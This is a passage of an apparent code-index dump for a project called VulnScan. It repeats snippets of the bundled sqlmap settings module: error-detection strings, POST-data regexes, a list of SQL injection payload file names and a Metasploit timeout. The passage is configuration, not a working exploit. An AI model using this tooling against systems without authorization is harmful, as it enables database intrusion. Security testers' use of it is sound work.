\"Conversion failed\", \"String or binary data would be truncated\", \"Failed to convert\", \"unable to interpret text value\", \"Input string was not in a correct format\", \"System.FormatException\", \"java.lang.NumberFormatException\", \"ValueError: invalid literal\", \"TypeMismatchException\", \"CF_SQL_INTEGER\", \"CF_SQL_NUMERIC\", \" for CFSQLTYPE \", \"cfqueryparam cfsqltype\", \"InvalidParamTypeException\", \"Invalid parameter type\", \"Attribute validation error for tag\", \"is not of type numeric\", \"<cfif Not IsNumeric(\", \"invalid input syntax for integer\", \"invalid input syntax for type\", \"invalid number\", \"character to number conversion error\", \"unable to interpret text value\", \"String was not recognized as a valid\", \"Convert.ToInt\", \"cannot be converted to a \", \"InvalidDataException\", \"Arguments are of the wrong type\")\n# Regular expression used for extracting ASP.NET view state values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_DOC_ROOT_DIRECTORY_NAMES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GENERIC_DOC_ROOT_DIRECTORY_NAMES = (\"htdocs\", \"httpdocs\", \"public\", \"wwwroot\", \"www\")\n# Maximum length of a help part containing switch/option name(s)\nMAX_HELP_OPTION_LENGTH = 18\n# Maximum number of connection retries (to prevent problems with recursion)\nMAX_CONNECT_RETRIES = 100\n# Strings for detecting formatting errors\nFORMAT_EXCEPTION_STRINGS = (\"Type mismatch\", \"Error converting\", \"Please enter a\", \"Conversion failed\", \"String or binary data would be truncated\", \"Failed to convert\", \"unable to interpret text value\", \"Input string was not in a correct format\", \"System.FormatException\", \"java.lang.NumberFormatException\", \"ValueError: invalid literal\", \"TypeMismatchException\", \"CF_SQL_INTEGER\", \"CF_SQL_NUMERIC\", \" for CFSQLTYPE \", \"cfqueryparam cfsqltype\", \"InvalidParamTypeException\", \"Invalid parameter type\", \"Attribute validation error for tag\", \"is not of type numeric\", \"<cfif Not IsNumeric(\", \"invalid input syntax for integer\", \"invalid input syntax for type\", \"invalid number\", \"character to number conversion error\", \"unable to interpret text value\", \"String was not recognized as a valid\", \"Convert.ToInt\", \"cannot be converted to a \", \"InvalidDataException\", \"Arguments are of the wrong type\")\n# Regular expression used for extracting ASP.NET view state values\nVIEWSTATE_REGEX = r'(?i)(?P<name>__VIEWSTATE[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Regular expression used for extracting ASP.NET event validation values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_HELP_OPTION_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_HELP_OPTION_LENGTH = 18\n# Maximum number of connection retries (to prevent problems with recursion)\nMAX_CONNECT_RETRIES = 100\n# Strings for detecting formatting errors\nFORMAT_EXCEPTION_STRINGS = (\"Type mismatch\", \"Error converting\", \"Please enter a\", \"Conversion failed\", \"String or binary data would be truncated\", \"Failed to convert\", \"unable to interpret text value\", \"Input string was not in a correct format\", \"System.FormatException\", \"java.lang.NumberFormatException\", \"ValueError: invalid literal\", \"TypeMismatchException\", \"CF_SQL_INTEGER\", \"CF_SQL_NUMERIC\", \" for CFSQLTYPE \", \"cfqueryparam cfsqltype\", \"InvalidParamTypeException\", \"Invalid parameter type\", \"Attribute validation error for tag\", \"is not of type numeric\", \"<cfif Not IsNumeric(\", \"invalid input syntax for integer\", \"invalid input syntax for type\", \"invalid number\", \"character to number conversion error\", \"unable to interpret text value\", \"String was not recognized as a valid\", \"Convert.ToInt\", \"cannot be converted to a \", \"InvalidDataException\", \"Arguments are of the wrong type\")\n# Regular expression used for extracting ASP.NET view state values\nVIEWSTATE_REGEX = r'(?i)(?P<name>__VIEWSTATE[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Regular expression used for extracting ASP.NET event validation values\nEVENTVALIDATION_REGEX = r'(?i)(?P<name>__EVENTVALIDATION[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Number of rows to generate inside the full union test for limited output (mustn't be too large to prevent payload length problems)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECT_RETRIES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_CONNECT_RETRIES = 100\n# Strings for detecting formatting errors\nFORMAT_EXCEPTION_STRINGS = (\"Type mismatch\", \"Error converting\", \"Please enter a\", \"Conversion failed\", \"String or binary data would be truncated\", \"Failed to convert\", \"unable to interpret text value\", \"Input string was not in a correct format\", \"System.FormatException\", \"java.lang.NumberFormatException\", \"ValueError: invalid literal\", \"TypeMismatchException\", \"CF_SQL_INTEGER\", \"CF_SQL_NUMERIC\", \" for CFSQLTYPE \", \"cfqueryparam cfsqltype\", \"InvalidParamTypeException\", \"Invalid parameter type\", \"Attribute validation error for tag\", \"is not of type numeric\", \"<cfif Not IsNumeric(\", \"invalid input syntax for integer\", \"invalid input syntax for type\", \"invalid number\", \"character to number conversion error\", \"unable to interpret text value\", \"String was not recognized as a valid\", \"Convert.ToInt\", \"cannot be converted to a \", \"InvalidDataException\", \"Arguments are of the wrong type\")\n# Regular expression used for extracting ASP.NET view state values\nVIEWSTATE_REGEX = r'(?i)(?P<name>__VIEWSTATE[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Regular expression used for extracting ASP.NET event validation values\nEVENTVALIDATION_REGEX = r'(?i)(?P<name>__EVENTVALIDATION[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Number of rows to generate inside the full union test for limited output (mustn't be too large to prevent payload length problems)\nLIMITED_ROWS_TEST_NUMBER = 15\n# Default adapter to use for bottle server",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FORMAT_EXCEPTION_STRINGS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FORMAT_EXCEPTION_STRINGS = (\"Type mismatch\", \"Error converting\", \"Please enter a\", \"Conversion failed\", \"String or binary data would be truncated\", \"Failed to convert\", \"unable to interpret text value\", \"Input string was not in a correct format\", \"System.FormatException\", \"java.lang.NumberFormatException\", \"ValueError: invalid literal\", \"TypeMismatchException\", \"CF_SQL_INTEGER\", \"CF_SQL_NUMERIC\", \" for CFSQLTYPE \", \"cfqueryparam cfsqltype\", \"InvalidParamTypeException\", \"Invalid parameter type\", \"Attribute validation error for tag\", \"is not of type numeric\", \"<cfif Not IsNumeric(\", \"invalid input syntax for integer\", \"invalid input syntax for type\", \"invalid number\", \"character to number conversion error\", \"unable to interpret text value\", \"String was not recognized as a valid\", \"Convert.ToInt\", \"cannot be converted to a \", \"InvalidDataException\", \"Arguments are of the wrong type\")\n# Regular expression used for extracting ASP.NET view state values\nVIEWSTATE_REGEX = r'(?i)(?P<name>__VIEWSTATE[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Regular expression used for extracting ASP.NET event validation values\nEVENTVALIDATION_REGEX = r'(?i)(?P<name>__EVENTVALIDATION[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Number of rows to generate inside the full union test for limited output (mustn't be too large to prevent payload length problems)\nLIMITED_ROWS_TEST_NUMBER = 15\n# Default adapter to use for bottle server\nRESTAPI_DEFAULT_ADAPTER = \"wsgiref\"\n# Default REST-JSON API server listen address",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIEWSTATE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VIEWSTATE_REGEX = r'(?i)(?P<name>__VIEWSTATE[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Regular expression used for extracting ASP.NET event validation values\nEVENTVALIDATION_REGEX = r'(?i)(?P<name>__EVENTVALIDATION[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Number of rows to generate inside the full union test for limited output (mustn't be too large to prevent payload length problems)\nLIMITED_ROWS_TEST_NUMBER = 15\n# Default adapter to use for bottle server\nRESTAPI_DEFAULT_ADAPTER = \"wsgiref\"\n# Default REST-JSON API server listen address\nRESTAPI_DEFAULT_ADDRESS = \"127.0.0.1\"\n# Default REST-JSON API server listen port",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EVENTVALIDATION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "EVENTVALIDATION_REGEX = r'(?i)(?P<name>__EVENTVALIDATION[^\"]*)[^>]+value=\"(?P<result>[^\"]+)'\n# Number of rows to generate inside the full union test for limited output (mustn't be too large to prevent payload length problems)\nLIMITED_ROWS_TEST_NUMBER = 15\n# Default adapter to use for bottle server\nRESTAPI_DEFAULT_ADAPTER = \"wsgiref\"\n# Default REST-JSON API server listen address\nRESTAPI_DEFAULT_ADDRESS = \"127.0.0.1\"\n# Default REST-JSON API server listen port\nRESTAPI_DEFAULT_PORT = 8775\n# Unsupported options by REST-JSON API server",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LIMITED_ROWS_TEST_NUMBER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LIMITED_ROWS_TEST_NUMBER = 15\n# Default adapter to use for bottle server\nRESTAPI_DEFAULT_ADAPTER = \"wsgiref\"\n# Default REST-JSON API server listen address\nRESTAPI_DEFAULT_ADDRESS = \"127.0.0.1\"\n# Default REST-JSON API server listen port\nRESTAPI_DEFAULT_PORT = 8775\n# Unsupported options by REST-JSON API server\nRESTAPI_UNSUPPORTED_OPTIONS = (\"sqlShell\", \"wizard\")\n# Use \"Supplementary Private Use Area-A\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_ADAPTER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RESTAPI_DEFAULT_ADAPTER = \"wsgiref\"\n# Default REST-JSON API server listen address\nRESTAPI_DEFAULT_ADDRESS = \"127.0.0.1\"\n# Default REST-JSON API server listen port\nRESTAPI_DEFAULT_PORT = 8775\n# Unsupported options by REST-JSON API server\nRESTAPI_UNSUPPORTED_OPTIONS = (\"sqlShell\", \"wizard\")\n# Use \"Supplementary Private Use Area-A\"\nINVALID_UNICODE_PRIVATE_AREA = False\n# Format used for representing invalid unicode characters",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_ADDRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RESTAPI_DEFAULT_ADDRESS = \"127.0.0.1\"\n# Default REST-JSON API server listen port\nRESTAPI_DEFAULT_PORT = 8775\n# Unsupported options by REST-JSON API server\nRESTAPI_UNSUPPORTED_OPTIONS = (\"sqlShell\", \"wizard\")\n# Use \"Supplementary Private Use Area-A\"\nINVALID_UNICODE_PRIVATE_AREA = False\n# Format used for representing invalid unicode characters\nINVALID_UNICODE_CHAR_FORMAT = r\"\\x%02x\"\n# Regular expression for XML POST data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_DEFAULT_PORT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RESTAPI_DEFAULT_PORT = 8775\n# Unsupported options by REST-JSON API server\nRESTAPI_UNSUPPORTED_OPTIONS = (\"sqlShell\", \"wizard\")\n# Use \"Supplementary Private Use Area-A\"\nINVALID_UNICODE_PRIVATE_AREA = False\n# Format used for representing invalid unicode characters\nINVALID_UNICODE_CHAR_FORMAT = r\"\\x%02x\"\n# Regular expression for XML POST data\nXML_RECOGNITION_REGEX = r\"(?s)\\A\\s*<[^>]+>(.+>)?\\s*\\Z\"\n# Regular expression used for detecting JSON POST data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTAPI_UNSUPPORTED_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RESTAPI_UNSUPPORTED_OPTIONS = (\"sqlShell\", \"wizard\")\n# Use \"Supplementary Private Use Area-A\"\nINVALID_UNICODE_PRIVATE_AREA = False\n# Format used for representing invalid unicode characters\nINVALID_UNICODE_CHAR_FORMAT = r\"\\x%02x\"\n# Regular expression for XML POST data\nXML_RECOGNITION_REGEX = r\"(?s)\\A\\s*<[^>]+>(.+>)?\\s*\\Z\"\n# Regular expression used for detecting JSON POST data\nJSON_RECOGNITION_REGEX = r'(?s)\\A(\\s*\\[)*\\s*\\{.*\"[^\"]+\"\\s*:\\s*(\"[^\"]*\"|\\d+|true|false|null|\\[).*\\}\\s*(\\]\\s*)*\\Z'\n# Regular expression used for detecting JSON-like POST data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INVALID_UNICODE_PRIVATE_AREA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INVALID_UNICODE_PRIVATE_AREA = False\n# Format used for representing invalid unicode characters\nINVALID_UNICODE_CHAR_FORMAT = r\"\\x%02x\"\n# Regular expression for XML POST data\nXML_RECOGNITION_REGEX = r\"(?s)\\A\\s*<[^>]+>(.+>)?\\s*\\Z\"\n# Regular expression used for detecting JSON POST data\nJSON_RECOGNITION_REGEX = r'(?s)\\A(\\s*\\[)*\\s*\\{.*\"[^\"]+\"\\s*:\\s*(\"[^\"]*\"|\\d+|true|false|null|\\[).*\\}\\s*(\\]\\s*)*\\Z'\n# Regular expression used for detecting JSON-like POST data\nJSON_LIKE_RECOGNITION_REGEX = r\"(?s)\\A(\\s*\\[)*\\s*\\{.*('[^']+'|\\\"[^\\\"]+\\\"|\\w+)\\s*:\\s*('[^']+'|\\\"[^\\\"]+\\\"|\\d+).*\\}\\s*(\\]\\s*)*\\Z\"\n# Regular expression used for detecting multipart POST data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INVALID_UNICODE_CHAR_FORMAT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INVALID_UNICODE_CHAR_FORMAT = r\"\\x%02x\"\n# Regular expression for XML POST data\nXML_RECOGNITION_REGEX = r\"(?s)\\A\\s*<[^>]+>(.+>)?\\s*\\Z\"\n# Regular expression used for detecting JSON POST data\nJSON_RECOGNITION_REGEX = r'(?s)\\A(\\s*\\[)*\\s*\\{.*\"[^\"]+\"\\s*:\\s*(\"[^\"]*\"|\\d+|true|false|null|\\[).*\\}\\s*(\\]\\s*)*\\Z'\n# Regular expression used for detecting JSON-like POST data\nJSON_LIKE_RECOGNITION_REGEX = r\"(?s)\\A(\\s*\\[)*\\s*\\{.*('[^']+'|\\\"[^\\\"]+\\\"|\\w+)\\s*:\\s*('[^']+'|\\\"[^\\\"]+\\\"|\\d+).*\\}\\s*(\\]\\s*)*\\Z\"\n# Regular expression used for detecting multipart POST data\nMULTIPART_RECOGNITION_REGEX = r\"(?i)Content-Disposition:[^;]+;\\s*name=\"\n# Regular expression used for detecting Array-like POST data",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "XML_RECOGNITION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "XML_RECOGNITION_REGEX = r\"(?s)\\A\\s*<[^>]+>(.+>)?\\s*\\Z\"\n# Regular expression used for detecting JSON POST data\nJSON_RECOGNITION_REGEX = r'(?s)\\A(\\s*\\[)*\\s*\\{.*\"[^\"]+\"\\s*:\\s*(\"[^\"]*\"|\\d+|true|false|null|\\[).*\\}\\s*(\\]\\s*)*\\Z'\n# Regular expression used for detecting JSON-like POST data\nJSON_LIKE_RECOGNITION_REGEX = r\"(?s)\\A(\\s*\\[)*\\s*\\{.*('[^']+'|\\\"[^\\\"]+\\\"|\\w+)\\s*:\\s*('[^']+'|\\\"[^\\\"]+\\\"|\\d+).*\\}\\s*(\\]\\s*)*\\Z\"\n# Regular expression used for detecting multipart POST data\nMULTIPART_RECOGNITION_REGEX = r\"(?i)Content-Disposition:[^;]+;\\s*name=\"\n# Regular expression used for detecting Array-like POST data\nARRAY_LIKE_RECOGNITION_REGEX = r\"(\\A|%s)(\\w+)\\[\\d*\\]=.+%s\\2\\[\\d*\\]=\" % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)\n# Default POST data content-type",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "JSON_RECOGNITION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "JSON_RECOGNITION_REGEX = r'(?s)\\A(\\s*\\[)*\\s*\\{.*\"[^\"]+\"\\s*:\\s*(\"[^\"]*\"|\\d+|true|false|null|\\[).*\\}\\s*(\\]\\s*)*\\Z'\n# Regular expression used for detecting JSON-like POST data\nJSON_LIKE_RECOGNITION_REGEX = r\"(?s)\\A(\\s*\\[)*\\s*\\{.*('[^']+'|\\\"[^\\\"]+\\\"|\\w+)\\s*:\\s*('[^']+'|\\\"[^\\\"]+\\\"|\\d+).*\\}\\s*(\\]\\s*)*\\Z\"\n# Regular expression used for detecting multipart POST data\nMULTIPART_RECOGNITION_REGEX = r\"(?i)Content-Disposition:[^;]+;\\s*name=\"\n# Regular expression used for detecting Array-like POST data\nARRAY_LIKE_RECOGNITION_REGEX = r\"(\\A|%s)(\\w+)\\[\\d*\\]=.+%s\\2\\[\\d*\\]=\" % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)\n# Default POST data content-type\nDEFAULT_CONTENT_TYPE = \"application/x-www-form-urlencoded; charset=utf-8\"\n# Raw text POST data content-type",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "JSON_LIKE_RECOGNITION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "JSON_LIKE_RECOGNITION_REGEX = r\"(?s)\\A(\\s*\\[)*\\s*\\{.*('[^']+'|\\\"[^\\\"]+\\\"|\\w+)\\s*:\\s*('[^']+'|\\\"[^\\\"]+\\\"|\\d+).*\\}\\s*(\\]\\s*)*\\Z\"\n# Regular expression used for detecting multipart POST data\nMULTIPART_RECOGNITION_REGEX = r\"(?i)Content-Disposition:[^;]+;\\s*name=\"\n# Regular expression used for detecting Array-like POST data\nARRAY_LIKE_RECOGNITION_REGEX = r\"(\\A|%s)(\\w+)\\[\\d*\\]=.+%s\\2\\[\\d*\\]=\" % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)\n# Default POST data content-type\nDEFAULT_CONTENT_TYPE = \"application/x-www-form-urlencoded; charset=utf-8\"\n# Raw text POST data content-type\nPLAIN_TEXT_CONTENT_TYPE = \"text/plain; charset=utf-8\"\n# Length used while checking for existence of Suhosin-patch (like) protection mechanism",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MULTIPART_RECOGNITION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MULTIPART_RECOGNITION_REGEX = r\"(?i)Content-Disposition:[^;]+;\\s*name=\"\n# Regular expression used for detecting Array-like POST data\nARRAY_LIKE_RECOGNITION_REGEX = r\"(\\A|%s)(\\w+)\\[\\d*\\]=.+%s\\2\\[\\d*\\]=\" % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)\n# Default POST data content-type\nDEFAULT_CONTENT_TYPE = \"application/x-www-form-urlencoded; charset=utf-8\"\n# Raw text POST data content-type\nPLAIN_TEXT_CONTENT_TYPE = \"text/plain; charset=utf-8\"\n# Length used while checking for existence of Suhosin-patch (like) protection mechanism\nSUHOSIN_MAX_VALUE_LENGTH = 512\n# Minimum size of an (binary) entry before it can be considered for dumping to disk",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ARRAY_LIKE_RECOGNITION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ARRAY_LIKE_RECOGNITION_REGEX = r\"(\\A|%s)(\\w+)\\[\\d*\\]=.+%s\\2\\[\\d*\\]=\" % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)\n# Default POST data content-type\nDEFAULT_CONTENT_TYPE = \"application/x-www-form-urlencoded; charset=utf-8\"\n# Raw text POST data content-type\nPLAIN_TEXT_CONTENT_TYPE = \"text/plain; charset=utf-8\"\n# Length used while checking for existence of Suhosin-patch (like) protection mechanism\nSUHOSIN_MAX_VALUE_LENGTH = 512\n# Minimum size of an (binary) entry before it can be considered for dumping to disk\nMIN_BINARY_DISK_DUMP_SIZE = 100\n# Filenames of payloads xml files (in order of loading)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_CONTENT_TYPE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_CONTENT_TYPE = \"application/x-www-form-urlencoded; charset=utf-8\"\n# Raw text POST data content-type\nPLAIN_TEXT_CONTENT_TYPE = \"text/plain; charset=utf-8\"\n# Length used while checking for existence of Suhosin-patch (like) protection mechanism\nSUHOSIN_MAX_VALUE_LENGTH = 512\n# Minimum size of an (binary) entry before it can be considered for dumping to disk\nMIN_BINARY_DISK_DUMP_SIZE = 100\n# Filenames of payloads xml files (in order of loading)\nPAYLOAD_XML_FILES = (\"boolean_blind.xml\", \"error_based.xml\", \"inline_query.xml\", \"stacked_queries.xml\", \"time_blind.xml\", \"union_query.xml\")\n# Regular expression used for extracting form tags",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PLAIN_TEXT_CONTENT_TYPE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PLAIN_TEXT_CONTENT_TYPE = \"text/plain; charset=utf-8\"\n# Length used while checking for existence of Suhosin-patch (like) protection mechanism\nSUHOSIN_MAX_VALUE_LENGTH = 512\n# Minimum size of an (binary) entry before it can be considered for dumping to disk\nMIN_BINARY_DISK_DUMP_SIZE = 100\n# Filenames of payloads xml files (in order of loading)\nPAYLOAD_XML_FILES = (\"boolean_blind.xml\", \"error_based.xml\", \"inline_query.xml\", \"stacked_queries.xml\", \"time_blind.xml\", \"union_query.xml\")\n# Regular expression used for extracting form tags\nFORM_SEARCH_REGEX = r\"(?si)<form(?!.+<form).+?</form>\"\n# Maximum number of lines to save in history file",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SUHOSIN_MAX_VALUE_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SUHOSIN_MAX_VALUE_LENGTH = 512\n# Minimum size of an (binary) entry before it can be considered for dumping to disk\nMIN_BINARY_DISK_DUMP_SIZE = 100\n# Filenames of payloads xml files (in order of loading)\nPAYLOAD_XML_FILES = (\"boolean_blind.xml\", \"error_based.xml\", \"inline_query.xml\", \"stacked_queries.xml\", \"time_blind.xml\", \"union_query.xml\")\n# Regular expression used for extracting form tags\nFORM_SEARCH_REGEX = r\"(?si)<form(?!.+<form).+?</form>\"\n# Maximum number of lines to save in history file\nMAX_HISTORY_LENGTH = 1000\n# Minimum field entry length needed for encoded content (hex, base64,...) check",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_BINARY_DISK_DUMP_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_BINARY_DISK_DUMP_SIZE = 100\n# Filenames of payloads xml files (in order of loading)\nPAYLOAD_XML_FILES = (\"boolean_blind.xml\", \"error_based.xml\", \"inline_query.xml\", \"stacked_queries.xml\", \"time_blind.xml\", \"union_query.xml\")\n# Regular expression used for extracting form tags\nFORM_SEARCH_REGEX = r\"(?si)<form(?!.+<form).+?</form>\"\n# Maximum number of lines to save in history file\nMAX_HISTORY_LENGTH = 1000\n# Minimum field entry length needed for encoded content (hex, base64,...) check\nMIN_ENCODED_LEN_CHECK = 5\n# Timeout in seconds in which Metasploit remote session has to be initialized",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_XML_FILES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PAYLOAD_XML_FILES = (\"boolean_blind.xml\", \"error_based.xml\", \"inline_query.xml\", \"stacked_queries.xml\", \"time_blind.xml\", \"union_query.xml\")\n# Regular expression used for extracting form tags\nFORM_SEARCH_REGEX = r\"(?si)<form(?!.+<form).+?</form>\"\n# Maximum number of lines to save in history file\nMAX_HISTORY_LENGTH = 1000\n# Minimum field entry length needed for encoded content (hex, base64,...) check\nMIN_ENCODED_LEN_CHECK = 5\n# Timeout in seconds in which Metasploit remote session has to be initialized\nMETASPLOIT_SESSION_TIMEOUT = 120\n# Reference: http://www.postgresql.org/docs/9.0/static/catalog-pg-largeobject.html",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FORM_SEARCH_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FORM_SEARCH_REGEX = r\"(?si)<form(?!.+<form).+?</form>\"\n# Maximum number of lines to save in history file\nMAX_HISTORY_LENGTH = 1000\n# Minimum field entry length needed for encoded content (hex, base64,...) check\nMIN_ENCODED_LEN_CHECK = 5\n# Timeout in seconds in which Metasploit remote session has to be initialized\nMETASPLOIT_SESSION_TIMEOUT = 120\n# Reference: http://www.postgresql.org/docs/9.0/static/catalog-pg-largeobject.html\nLOBLKSIZE = 2048\n# Prefix used to mark special variables (e.g. keywords, having special chars, etc.)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_HISTORY_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_HISTORY_LENGTH = 1000\n# Minimum field entry length needed for encoded content (hex, base64,...) check\nMIN_ENCODED_LEN_CHECK = 5\n# Timeout in seconds in which Metasploit remote session has to be initialized\nMETASPLOIT_SESSION_TIMEOUT = 120\n# Reference: http://www.postgresql.org/docs/9.0/static/catalog-pg-largeobject.html\nLOBLKSIZE = 2048\n# Prefix used to mark special variables (e.g. keywords, having special chars, etc.)\nEVALCODE_ENCODED_PREFIX = \"EVAL_\"\n# Reference: https://en.wikipedia.org/wiki/Zip_(file_format)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_ENCODED_LEN_CHECK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_ENCODED_LEN_CHECK = 5\n# Timeout in seconds in which Metasploit remote session has to be initialized\nMETASPLOIT_SESSION_TIMEOUT = 120\n# Reference: http://www.postgresql.org/docs/9.0/static/catalog-pg-largeobject.html\nLOBLKSIZE = 2048\n# Prefix used to mark special variables (e.g. keywords, having special chars, etc.)\nEVALCODE_ENCODED_PREFIX = \"EVAL_\"\n# Reference: https://en.wikipedia.org/wiki/Zip_(file_format)\nZIP_HEADER = b\"\\x50\\x4b\\x03\\x04\"\n# Reference: http://www.cookiecentral.com/faq/#3.5",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "METASPLOIT_SESSION_TIMEOUT",
        "kind": 5,
